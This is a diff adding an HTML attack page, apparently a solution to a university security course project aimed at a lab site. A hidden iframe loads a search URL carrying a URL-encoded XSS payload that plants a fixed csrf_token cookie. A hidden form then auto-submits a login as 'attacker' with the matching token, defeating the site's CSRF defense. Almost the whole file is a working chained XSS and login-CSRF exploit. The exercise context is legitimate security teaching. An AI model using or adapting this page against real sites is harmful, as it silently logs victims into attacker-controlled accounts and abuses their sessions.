@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <script>
+        function login(){
+            document.getElementById("my_form").submit();
+        }
+    </script>
+
+    <div style="visibility: hidden;">
+        <iframe name="my_iframe"></iframe>
+
+        <form id="my_form" method="POST" action="https://project2.ecen4133.org/login?" target="my_iframe">
+            <input type="text" name="username" value="attacker" />
+            <input type="text" name="password" value="l33th4x" />
+            <input type="text" name="csrfdefense" value="1" />
+            <input type="text" name="xssdefense" value="0" />
+            <input type="text" name="csrf_token" value="bcac46e97f8a5129ffdc80847bf142cb" />
+        </form>
+
+        <iframe name="set_token" onload="login()" src="https://project2.ecen4133.org/search?xssdefense=0&csrfdefense=1&q=%24%28function%28%29%7B%3Cscript%3Edocument.cookie%3D%27csrf_token%3Dbcac46e97f8a5129ffdc80847bf142cb%27%3C%2Fscript%3E%7D%29%3B"></iframe>
+    </div>
+</head>
+</html>
